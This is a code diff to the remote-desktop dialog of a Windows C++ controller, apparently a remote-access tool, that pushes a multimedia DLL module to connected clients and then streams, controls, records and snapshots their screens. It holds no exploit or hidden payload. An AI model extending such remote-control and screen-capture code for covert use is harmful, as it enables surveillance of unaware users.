@@ -1,6 +1,7 @@
 ﻿// DesktopDialog.cpp - 远程桌面对话框实现
 #include "DesktopDialog.h"
 #include "../resource.h"
+#include "../GlobalState.h"
 #include "../../Common/Config.h"
 #include "../../Common/ClientTypes.h"
 #include <CommCtrl.h>
@@ -8,18 +9,41 @@
 #include <vector>
 #include <map>
 #include <mutex>
+#include <string>
 #include "../Utils/StringHelper.h"
+#include "../MainWindow.h"
 #pragma comment(lib, "comctl32.lib")
 
 extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
 extern std::mutex g_ClientsMutex;
 extern HINSTANCE g_hInstance;
 extern bool SendDataToClient(std::shared_ptr<Formidable::ConnectedClient> client, const void* pData, int iLength);
+extern bool SendModuleToClient(uint32_t clientId, uint32_t cmd, const std::wstring& dllName, uint32_t arg2 = 0);
 
 namespace Formidable {
 namespace UI {
 
-static std::map<HWND, uint32_t> s_dlgToClientId;
+// 每个窗口独立状态
+struct DesktopState {
+    uint32_t clientId = 0;
+    int fps = 15;
+    int quality = 0; // 0=1080p, 1=Original
+    int compress = 1; // 0=Raw, 1=JPEG
+    bool useGrayscale = false;
+    bool useDiff = true;
+    bool isControlEnabled = false;
+    bool isFullscreen = false;
+    bool isStretched = true;
+    
+    // 运行时状态
+    int retryCount = 0;
+    bool hasFrame = false;
+    bool isRecording = false;
+};
+
+static std::map<HWND, DesktopState> s_desktopStates;
+static const UINT WM_APP_DESKTOP_FRAME = WM_APP + 220;
+static const UINT_PTR TIMER_DESKTOP_FIRST_FRAME = 0xD260;
 
 // 远程桌面子类化过程
 LRESULT CALLBACK DesktopScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
@@ -29,6 +53,35 @@ LRESULT CALLBACK DesktopScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARA
     {
         std::lock_guard<std::mutex> lock(g_ClientsMutex);
         if (g_Clients.count(cid)) client = g_Clients[cid];
+    }
+
+    if (message == WM_PAINT) {
+        PAINTSTRUCT ps;
+        HDC hdc = BeginPaint(hWnd, &ps);
+        RECT rc;
+        GetClientRect(hWnd, &rc);
+        
+        HBITMAP hBmp = (HBITMAP)SendMessage(hWnd, STM_GETIMAGE, IMAGE_BITMAP, 0);
+        if (hBmp) {
+            HDC hMemDC = CreateCompatibleDC(hdc);
+            HBITMAP hOldBmp = (HBITMAP)SelectObject(hMemDC, hBmp);
+            
+            BITMAP bmp;
+            GetObject(hBmp, sizeof(BITMAP), &bmp);
+            
+            // 强制拉伸显示
+            SetStretchBltMode(hdc, COLORONCOLOR);
+            StretchBlt(hdc, 0, 0, rc.right, rc.bottom, hMemDC, 0, 0, bmp.bmWidth, bmp.bmHeight, SRCCOPY);
+            
+            SelectObject(hMemDC, hOldBmp);
+            DeleteDC(hMemDC);
+        } else {
+            // 绘制黑色背景
+            FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
+        }
+        
+        EndPaint(hWnd, &ps);
+        return 0;
     }
 
     if (client && client->isMonitoring) {
@@ -59,12 +112,10 @@ LRESULT CALLBACK DesktopScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARA
             ev.msg = message;
             RECT rc;
             GetClientRect(hWnd, &rc);
-            HBITMAP hBmp = (HBITMAP)SendMessage(hWnd, STM_GETIMAGE, IMAGE_BITMAP, 0);
-            if (hBmp) {
-                BITMAP bmp;
-                GetObject(hBmp, sizeof(BITMAP), &bmp);
-                ev.x = (short)LOWORD(lParam) * bmp.bmWidth / (rc.right == 0 ? 1 : rc.right);
-                ev.y = (short)HIWORD(lParam) * bmp.bmHeight / (rc.bottom == 0 ? 1 : rc.bottom);
+            // 归一化坐标 0-65535
+            if (rc.right > 0 && rc.bottom > 0) {
+                ev.x = (int32_t)LOWORD(lParam) * 65535 / rc.right;
+                ev.y = (int32_t)HIWORD(lParam) * 65535 / rc.bottom;
             }
             if (message == WM_MOUSEWHEEL) ev.data = (short)HIWORD(wParam);
             SendRemoteControl(Formidable::CMD_MOUSE_EVENT, &ev, sizeof(Formidable::RemoteMouseEvent));
@@ -85,20 +136,33 @@ LRESULT CALLBACK DesktopScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARA
     return DefSubclassProc(hWnd, message, wParam, lParam);
 }
 
-// 全局静态控制状态
-static bool s_isControlEnabled = true;
-static bool s_isFullscreen = false;
-static bool s_isStretched = false;
-static int s_currentFPS = 15;
-static int s_currentQuality = 1; // 0=1080P, 1=原始
-static int s_currentCompress = 0; // 0=RAW, 1=JPEG
+#define IDM_DESKTOP_COMPRESS_GRAYSCALE 50001
+#define IDM_DESKTOP_COMPRESS_DIFF 50002
 
 INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
     switch (message) {
     case WM_INITDIALOG: {
-        uint32_t clientId = (uint32_t)lParam;
-        s_dlgToClientId[hDlg] = clientId;
+        struct InitParams {
+            uint32_t clientId;
+            bool isGrayscale;
+        };
+        InitParams* params = (InitParams*)lParam;
+        uint32_t clientId = params->clientId;
+        bool isGrayscale = params->isGrayscale;
+        delete params; // Clean up
+
+        // Initialize state
+        DesktopState state;
+        state.clientId = clientId;
+        state.useGrayscale = isGrayscale;
+        state.useDiff = g_Settings.useDiffTransmission; // Use global setting
+        state.compress = g_Settings.imageCompressMethod; // Use global setting
+        state.retryCount = 0;
+        state.hasFrame = false;
+        state.isRecording = false;
         
+        s_desktopStates[hDlg] = state;
+
         SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_DESKTOP)));
         SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_DESKTOP)));
 
@@ -113,11 +177,28 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
             
             // 设置默认标题
             std::wstring title = L"远程桌面 - " + Formidable::Utils::StringHelper::UTF8ToWide(client->info.computerName);
+            if (state.useGrayscale) title += L" (灰度模式)";
             SetWindowTextW(hDlg, title.c_str());
+            
+            // 初始化屏幕显示控件，设置文本提示
+            HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
+            if (hStatic) {
+                SetWindowTextW(hStatic, L"正在请求画面...");
+            }
+            
+            // 先加载多媒体模块（必须携带 arg2，客户端才会将其识别为多媒体常驻模块）
+            if (!SendModuleToClient(clientId, Formidable::CMD_LOAD_MODULE, L"Multimedia.dll", Formidable::CMD_SCREEN_CAPTURE)) {
+                if (hStatic) SetWindowTextW(hStatic, L"加载多媒体模块失败");
+                break;
+            }
+            
+            // 等待模块加载完成
+            Sleep(100);
             
             Formidable::CommandPkg pkg = { 0 };
             pkg.cmd = Formidable::CMD_SCREEN_CAPTURE;
             pkg.arg1 = 1;
+            pkg.arg2 = 0;
             
             size_t bodySize = sizeof(Formidable::CommandPkg);
             std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
@@ -129,8 +210,55 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
             
             SendDataToClient(client, buffer.data(), (int)buffer.size());
             
+            Formidable::CommandPkg compressPkg = { 0 };
+            compressPkg.cmd = Formidable::CMD_SCREEN_COMPRESS;
+            compressPkg.arg1 = state.compress;
+            compressPkg.arg2 = (state.useDiff ? 2 : 0) | (state.useGrayscale ? 1 : 0);
+            
+            size_t compressBodySize = sizeof(Formidable::CommandPkg);
+            std::vector<char> compressBuffer(sizeof(Formidable::PkgHeader) + compressBodySize);
+            Formidable::PkgHeader* compressHeader = (Formidable::PkgHeader*)compressBuffer.data();
+            memcpy(compressHeader->flag, "FRMD26?", 7);
+            compressHeader->originLen = (int)compressBodySize;
+            compressHeader->totalLen = (int)compressBuffer.size();
+            memcpy(compressBuffer.data() + sizeof(Formidable::PkgHeader), &compressPkg, compressBodySize);
+            
+            SendDataToClient(client, compressBuffer.data(), (int)compressBuffer.size());
+            
+            Formidable::CommandPkg qualityPkg = { 0 };
+            qualityPkg.cmd = Formidable::CMD_SCREEN_QUALITY;
+            qualityPkg.arg1 = state.quality;
+            qualityPkg.arg2 = 0;
+
+            size_t qualityBodySize = sizeof(Formidable::CommandPkg);
+            std::vector<char> qualityBuffer(sizeof(Formidable::PkgHeader) + qualityBodySize);
+            Formidable::PkgHeader* qualityHeader = (Formidable::PkgHeader*)qualityBuffer.data();
+            memcpy(qualityHeader->flag, "FRMD26?", 7);
+            qualityHeader->originLen = (int)qualityBodySize;
+            qualityHeader->totalLen = (int)qualityBuffer.size();
+            memcpy(qualityBuffer.data() + sizeof(Formidable::PkgHeader), &qualityPkg, qualityBodySize);
+
+            SendDataToClient(client, qualityBuffer.data(), (int)qualityBuffer.size());
+
+            Formidable::CommandPkg fpsPkg = { 0 };
+            fpsPkg.cmd = Formidable::CMD_SCREEN_FPS;
+            fpsPkg.arg1 = state.fps;
+            fpsPkg.arg2 = 0;
+
+            size_t fpsBodySize = sizeof(Formidable::CommandPkg);
+            std::vector<char> fpsBuffer(sizeof(Formidable::PkgHeader) + fpsBodySize);
+            Formidable::PkgHeader* fpsHeader = (Formidable::PkgHeader*)fpsBuffer.data();
+            memcpy(fpsHeader->flag, "FRMD26?", 7);
+            fpsHeader->originLen = (int)fpsBodySize;
+            fpsHeader->totalLen = (int)fpsBuffer.size();
+            memcpy(fpsBuffer.data() + sizeof(Formidable::PkgHeader), &fpsPkg, fpsBodySize);
+
+            SendDataToClient(client, fpsBuffer.data(), (int)fpsBuffer.size());
+
+            SetTimer(hDlg, TIMER_DESKTOP_FIRST_FRAME, 2500, NULL);
+            
             // Subclass the static control to capture inputs
-            HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
+            hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
             SetWindowSubclass(hStatic, DesktopScreenProc, clientId, (DWORD_PTR)hDlg);
         }
 
@@ -145,7 +273,92 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
         }
         return (INT_PTR)TRUE;
     }
+    case WM_TIMER: {
+        if (wParam == TIMER_DESKTOP_FIRST_FRAME) {
+            DesktopState& state = s_desktopStates[hDlg];
+            
+            if (!state.hasFrame) {
+                if (state.retryCount >= 3) {
+                    KillTimer(hDlg, TIMER_DESKTOP_FIRST_FRAME);
+                    HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
+                    if (hStatic) SetWindowTextW(hStatic, L"连接超时，未收到画面");
+                    AddLog(L"桌面", L"连接超时，未收到画面");
+                    return (INT_PTR)TRUE;
+                }
+
+                state.retryCount++;
+                HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
+                
+                if (state.retryCount == 1 && state.compress != 0) {
+                    state.compress = 0;
+                    if (hStatic) SetWindowTextW(hStatic, L"未收到画面，切换RAW重试...");
+                    AddLog(L"桌面", L"未收到画面，切换RAW重试");
+                } else {
+                    if (hStatic) SetWindowTextW(hStatic, L"未收到画面，正在重试...");
+                    AddLog(L"桌面", L"未收到画面，正在重试");
+                }
+
+                uint32_t clientId = state.clientId;
+                std::shared_ptr<Formidable::ConnectedClient> client;
+                {
+                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
+                    if (g_Clients.count(clientId)) client = g_Clients[clientId];
+                }
+                if (!client) return (INT_PTR)TRUE;
+
+                SendModuleToClient(clientId, Formidable::CMD_LOAD_MODULE, L"Multimedia.dll", Formidable::CMD_SCREEN_CAPTURE);
+
+                Formidable::CommandPkg pkg = { 0 };
+                pkg.cmd = Formidable::CMD_SCREEN_CAPTURE;
+                pkg.arg1 = 1;
+                // arg2: Capture Method (0=GDI, 1=DXGI)
+                pkg.arg2 = g_Settings.screenCaptureMethod;
+
+                size_t bodySize = sizeof(Formidable::CommandPkg);
+                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
+                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
+                memcpy(header->flag, "FRMD26?", 7);
+                header->originLen = (int)bodySize;
+                header->totalLen = (int)buffer.size();
+                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
+                SendDataToClient(client, buffer.data(), (int)buffer.size());
+
+                Formidable::CommandPkg compressPkg = { 0 };
+                compressPkg.cmd = Formidable::CMD_SCREEN_COMPRESS;
+                compressPkg.arg1 = state.compress;
+                compressPkg.arg2 = (state.useDiff ? 2 : 0) | (state.useGrayscale ? 1 : 0);
+
+                size_t compressBodySize = sizeof(Formidable::CommandPkg);
+                std::vector<char> compressBuffer(sizeof(Formidable::PkgHeader) + compressBodySize);
+                Formidable::PkgHeader* compressHeader = (Formidable::PkgHeader*)compressBuffer.data();
+                memcpy(compressHeader->flag, "FRMD26?", 7);
+                compressHeader->originLen = (int)compressBodySize;
+                compressHeader->totalLen = (int)compressBuffer.size();
+                memcpy(compressBuffer.data() + sizeof(Formidable::PkgHeader), &compressPkg, compressBodySize);
+                SendDataToClient(client, compressBuffer.data(), (int)compressBuffer.size());
+            }
+            return (INT_PTR)TRUE;
+        }
+        break;
+    }
+    case WM_APP_DESKTOP_FRAME: {
+        if (s_desktopStates.count(hDlg)) {
+            s_desktopStates[hDlg].hasFrame = true;
+            KillTimer(hDlg, TIMER_DESKTOP_FIRST_FRAME);
+            HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
+            if (hStatic) SetWindowTextW(hStatic, L"");
+        }
+        return (INT_PTR)TRUE;
+    }
     case WM_CONTEXTMENU: {
+        // 如果点击的是画面区域(IDC_STATIC_SCREEN)，则不显示菜单
+        HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
+        if ((HWND)wParam == hStatic) {
+            return (INT_PTR)TRUE;
+        }
+
+        DesktopState& state = s_desktopStates[hDlg];
+
         POINT pt = { GET_X_LPARAM(lParam), GET_Y_LPARAM(lParam) };
         HMENU hMenu = CreatePopupMenu();
         HMENU hFpsMenu = CreatePopupMenu();
@@ -155,24 +368,25 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
         // FPS子菜单
         AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_5, L"5 FPS");
         AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_10, L"10 FPS");
-        AppendMenuW(hFpsMenu, (s_currentFPS == 15 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_15, L"15 FPS");
+        AppendMenuW(hFpsMenu, (state.fps == 15 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_15, L"15 FPS");
         AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_20, L"20 FPS");
         AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_25, L"25 FPS");
         AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_30, L"30 FPS");
         
         // 分辨率子菜单
-        AppendMenuW(hResMenu, (s_currentQuality == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_ORIGINAL, L"原始分辨率");
-        AppendMenuW(hResMenu, (s_currentQuality == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_1080P, L"1080P");
+        AppendMenuW(hResMenu, (state.quality == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_ORIGINAL, L"原始分辨率");
+        AppendMenuW(hResMenu, (state.quality == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_1080P, L"1080P");
 
         // 压缩方案子菜单
-        AppendMenuW(hCompMenu, (s_currentCompress == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_RAW, L"未压缩 (RAW)");
-        AppendMenuW(hCompMenu, (s_currentCompress == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_JPEG, L"高效压缩 (JPEG)");
+        AppendMenuW(hCompMenu, (state.compress == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_RAW, L"未压缩 (RAW)");
+        AppendMenuW(hCompMenu, (state.compress == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_JPEG, L"高效压缩 (JPEG)");
+        // 移除灰度模式和差异传输选项 (已改为设置或启动参数)
         
         // 主菜单
-        AppendMenuW(hMenu, (s_isControlEnabled ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_CONTROL, L"鼠标控制(&C)");
+        AppendMenuW(hMenu, (state.isControlEnabled ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_CONTROL, L"控制屏幕(&C)");
         AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
-        AppendMenuW(hMenu, (s_isFullscreen ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FULLSCREEN, L"全屏显示(&F)");
-        AppendMenuW(hMenu, (s_isStretched ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_STRETCH, L"拉伸显示(&S)");
+        // AppendMenuW(hMenu, (state.isFullscreen ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FULLSCREEN, L"全屏显示(&F)");
+        // AppendMenuW(hMenu, (state.isStretched ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_STRETCH, L"拉伸显示(&S)");
         AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_TRACK_CURSOR, L"跟踪光标(&T)");
         AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_REMOTE_CURSOR, L"显示远程光标(&R)");
         AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
@@ -194,7 +408,8 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
         return (INT_PTR)TRUE;
     }
     case WM_COMMAND: {
-        uint32_t clientId = s_dlgToClientId[hDlg];
+        DesktopState& state = s_desktopStates[hDlg];
+        uint32_t clientId = state.clientId;
         std::shared_ptr<Formidable::ConnectedClient> client;
         {
             std::lock_guard<std::mutex> lock(g_ClientsMutex);
@@ -221,14 +436,14 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
 
         switch (LOWORD(wParam)) {
         case IDM_DESKTOP_CONTROL:
-            s_isControlEnabled = !s_isControlEnabled;
-            client->isMonitoring = s_isControlEnabled;
-            MessageBoxW(hDlg, s_isControlEnabled ? L"已启用鼠标控制" : L"已禁用鼠标控制", L"提示", MB_OK);
+            state.isControlEnabled = !state.isControlEnabled;
+            client->isMonitoring = state.isControlEnabled;
+            // MessageBoxW(hDlg, state.isControlEnabled ? L"已启用鼠标控制" : L"已禁用鼠标控制", L"提示", MB_OK);
             break;
             
         case IDM_DESKTOP_FULLSCREEN: {
-            s_isFullscreen = !s_isFullscreen;
-            if (s_isFullscreen) {
+            state.isFullscreen = !state.isFullscreen;
+            if (state.isFullscreen) {
                 SetWindowLongPtr(hDlg, GWL_STYLE, WS_POPUP | WS_VISIBLE);
                 ShowWindow(hDlg, SW_MAXIMIZE);
             } else {
@@ -239,8 +454,8 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
         }
         
         case IDM_DESKTOP_STRETCH:
-            s_isStretched = !s_isStretched;
-            MessageBoxW(hDlg, s_isStretched ? L"已启用拉伸显示" : L"已禁用拉伸显示", L"提示", MB_OK);
+            state.isStretched = !state.isStretched;
+            MessageBoxW(hDlg, state.isStretched ? L"已启用拉伸显示" : L"已禁用拉伸显示", L"提示", MB_OK);
             break;
             
         case IDM_DESKTOP_FPS_5:
@@ -250,7 +465,7 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
         case IDM_DESKTOP_FPS_25:
         case IDM_DESKTOP_FPS_30: {
             int fps = 5 + (LOWORD(wParam) - IDM_DESKTOP_FPS_5) * 5;
-            s_currentFPS = fps;
+            state.fps = fps;
             SendCommand(Formidable::CMD_SCREEN_FPS, fps);
             wchar_t msg[64];
             wsprintfW(msg, L"已设置帧率为 %d FPS", fps);
@@ -259,27 +474,35 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
         }
         
         case IDM_DESKTOP_RES_ORIGINAL:
-            s_currentQuality = 1;
+            state.quality = 1;
             SendCommand(Formidable::CMD_SCREEN_QUALITY, 1);
             MessageBoxW(hDlg, L"已设置原始分辨率", L"提示", MB_OK);
             break;
             
         case IDM_DESKTOP_RES_1080P:
-            s_currentQuality = 0;
+            state.quality = 0;
             SendCommand(Formidable::CMD_SCREEN_QUALITY, 0);
             MessageBoxW(hDlg, L"已设置1080P限制", L"提示", MB_OK);
             break;
 
         case IDM_DESKTOP_COMPRESS_RAW:
-            s_currentCompress = 0;
-            SendCommand(Formidable::CMD_SCREEN_COMPRESS, 0);
+            state.compress = 0;
+            SendCommand(Formidable::CMD_SCREEN_COMPRESS, 0, (state.useDiff ? 2 : 0) | (state.useGrayscale ? 1 : 0));
             MessageBoxW(hDlg, L"已切换至 RAW (无损) 传输", L"提示", MB_OK);
             break;
 
         case IDM_DESKTOP_COMPRESS_JPEG:
-            s_currentCompress = 1;
-            SendCommand(Formidable::CMD_SCREEN_COMPRESS, 1);
+            state.compress = 1;
+            SendCommand(Formidable::CMD_SCREEN_COMPRESS, 1, (state.useDiff ? 2 : 0) | (state.useGrayscale ? 1 : 0));
             MessageBoxW(hDlg, L"已切换至 JPEG (压缩) 传输", L"提示", MB_OK);
+            break;
+            
+        case IDM_DESKTOP_COMPRESS_GRAYSCALE:
+            // 移除热切换支持
+            break;
+
+        case IDM_DESKTOP_COMPRESS_DIFF:
+            // 移除热切换支持
             break;
             
         case IDM_DESKTOP_LOCK_INPUT:
@@ -301,23 +524,74 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
             break;
             
         case IDM_DESKTOP_SNAPSHOT: {
-            // 保存当前屏幕截图
             HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
             HBITMAP hBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
             if (hBmp) {
+                BITMAP bmp;
+                GetObject(hBmp, sizeof(BITMAP), &bmp);
+                
+                BITMAPINFOHEADER bi;
+                bi.biSize = sizeof(BITMAPINFOHEADER);
+                bi.biWidth = bmp.bmWidth;
+                bi.biHeight = bmp.bmHeight;
+                bi.biPlanes = 1;
+                bi.biBitCount = 24;
+                bi.biCompression = BI_RGB;
+                bi.biSizeImage = 0;
+                bi.biXPelsPerMeter = 0;
+                bi.biYPelsPerMeter = 0;
+                bi.biClrUsed = 0;
+                bi.biClrImportant = 0;
+                
+                int rowSize = ((bmp.bmWidth * 24 + 31) / 32) * 4;
+                DWORD dwSizeImage = rowSize * bmp.bmHeight;
+                std::vector<char> bmpData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwSizeImage);
+                
+                BITMAPFILEHEADER* pBFH = (BITMAPFILEHEADER*)bmpData.data();
+                pBFH->bfType = 0x4D42;
+                pBFH->bfSize = (DWORD)bmpData.size();
+                pBFH->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+                
+                memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(bi));
+                
+                HDC hdc = GetDC(hStatic);
+                GetDIBits(hdc, hBmp, 0, bmp.bmHeight, bmpData.data() + pBFH->bfOffBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+                ReleaseDC(hStatic, hdc);
+                
                 wchar_t filename[MAX_PATH];
                 SYSTEMTIME st;
                 GetLocalTime(&st);
                 wsprintfW(filename, L"screenshot_%04d%02d%02d_%02d%02d%02d.bmp", 
                     st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
-                // TODO: 保存位图到文件
-                MessageBoxW(hDlg, L"截图保存功能待实现", L"提示", MB_OK);
+                
+                HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    DWORD dwWritten;
+                    WriteFile(hFile, bmpData.data(), (DWORD)bmpData.size(), &dwWritten, NULL);
+                    CloseHandle(hFile);
+                    
+                    wchar_t msg[MAX_PATH + 100];
+                    wsprintfW(msg, L"截图已保存到: %s", filename);
+                    MessageBoxW(hDlg, msg, L"提示", MB_OK);
+                } else {
+                    MessageBoxW(hDlg, L"保存截图失败", L"错误", MB_OK | MB_ICONERROR);
+                }
+            } else {
+                MessageBoxW(hDlg, L"没有可保存的截图", L"提示", MB_OK);
             }
             break;
         }
         
         case IDM_DESKTOP_REC_MJPEG:
-            MessageBoxW(hDlg, L"视频录制功能待实现", L"提示", MB_OK);
+            if (!state.isRecording) {
+                SendCommand(Formidable::CMD_VIDEO_STREAM, 1);
+                state.isRecording = true;
+                MessageBoxW(hDlg, L"视频录制已开始", L"提示", MB_OK);
+            } else {
+                SendCommand(Formidable::CMD_VIDEO_STREAM, 0);
+                state.isRecording = false;
+                MessageBoxW(hDlg, L"视频录制已停止", L"提示", MB_OK);
+            }
             break;
             
         case IDCANCEL:
@@ -326,9 +600,13 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
         }
         break;
     }
-    case WM_CLOSE:
-        if (s_dlgToClientId.count(hDlg)) {
-            uint32_t clientId = s_dlgToClientId[hDlg];
+    case WM_CLOSE: {
+        KillTimer(hDlg, TIMER_DESKTOP_FIRST_FRAME);
+        
+        if (s_desktopStates.count(hDlg)) {
+            DesktopState& state = s_desktopStates[hDlg];
+            uint32_t clientId = state.clientId;
+            
             HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
             RemoveWindowSubclass(hStatic, DesktopScreenProc, clientId);
             
@@ -359,16 +637,24 @@ INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, 
                 SendDataToClient(client, buffer.data(), (int)buffer.size());
             }
             
-            s_dlgToClientId.erase(hDlg);
+            s_desktopStates.erase(hDlg); // Cleanup state
         }
+        
         DestroyWindow(hDlg);
         return (INT_PTR)TRUE;
+    }
     }
     return (INT_PTR)FALSE;
 }
 
-HWND DesktopDialog::Show(HWND hParent, uint32_t clientId) {
-    return CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_DESKTOP), hParent, DlgProc, (LPARAM)clientId);
+HWND DesktopDialog::Show(HWND hParent, uint32_t clientId, bool isGrayscale) {
+    // Pass params as a struct pointer
+    struct InitParams {
+        uint32_t clientId;
+        bool isGrayscale;
+    };
+    InitParams* params = new InitParams{ clientId, isGrayscale };
+    return CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_DESKTOP), hParent, DlgProc, (LPARAM)params);
 }
 
 } // namespace UI
